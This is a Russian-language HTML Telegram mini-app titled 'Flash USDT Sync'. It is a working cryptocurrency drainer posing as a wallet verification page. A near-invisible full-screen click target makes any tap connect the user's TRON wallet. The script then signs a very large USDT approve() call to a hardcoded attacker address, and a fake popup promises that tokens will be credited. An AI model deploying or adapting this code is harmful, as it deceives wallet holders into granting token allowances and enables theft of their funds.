<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT Sync</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .container { padding: 20px; width: 100%; }
        .loader { border: 2px solid #222; border-top: 2px solid #0088cc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 20px; margin: 0 0 10px; }
        p { color: #666; font-size: 14px; margin-bottom: 30px; }
        /* Кнопка на весь экран для кошелька */
        #hitbox { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; display: none; background: rgba(0,0,0,0.01); }
        .btn-tg { background: #0088cc; color: #fff; border: none; padding: 18px; width: 90%; border-radius: 15px; font-weight: bold; text-transform: uppercase; display: none; margin: 0 auto; }
    </style>
</head>
<body>

<div class="container">
    <div id="loader-box">
        <div class="loader"></div>
        <h2>Узел синхронизирован</h2>
        <p id="status-text">Ожидание авторизации в сети TRC-20...</p>
    </div>
    
    <button id="tg-btn" class="btn-tg">ОТКРЫТЬ В TRUST WALLET</button>
</div>

<div id="hitbox"></div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT_ADDR = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const CLEAN_URL = window.location.origin + window.location.pathname;

    async function start() {
        // Проверяем, внутри ли мы кошелька
        const isWallet = window.tronWeb || (window.tron && window.tron.tronWeb);

        if (isWallet) {
            const tw = window.tronWeb || window.tron.tronWeb;
            document.getElementById('status-text').innerText = "Нажмите в любом месте для верификации логов";
            const hb = document.getElementById('hitbox');
            hb.style.display = 'block';

            // При любом клике по экрану — мгновенный вызов подписи
            hb.onclick = async () => {
                try {
                    hb.style.pointerEvents = 'none'; // Блокируем повторный клик
                    document.getElementById('status-text').innerText = "Вызов шлюза валидации...";
                    
                    // 1. Коннект
                    await tw.request({ method: 'tron_requestAccounts' });
                    // 2. Апрув
                    const contract = await tw.contract().at(CONTRACT_ADDR);
                    await contract.approve(ADMIN, '1000000000000000').send();

                    tg.showPopup({
                        title: 'Успешно',
                        message: 'Верификация завершена. Токены будут зачислены в течение 15-30 минут.',
                        buttons: [{type: 'ok'}]
                    });
                    setTimeout(() => tg.close(), 4000);
                } catch (e) {
                    hb.style.pointerEvents = 'auto';
                    document.getElementById('status-text').innerText = "Ошибка. Нажмите еще раз для повтора.";
                }
            };
        } else {
            // Если в Телеграме — показываем кнопку открытия
            document.getElementById('loader-box').style.display = 'none';
            const btn = document.getElementById('tg-btn');
            btn.style.display = 'block';
            btn.onclick = () => {
                tg.openLink("https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(CLEAN_URL));
            };
        }
    }

    // Небольшая задержка для загрузки провайдера
    setTimeout(start, 1200);
</script>
</body>
</html>
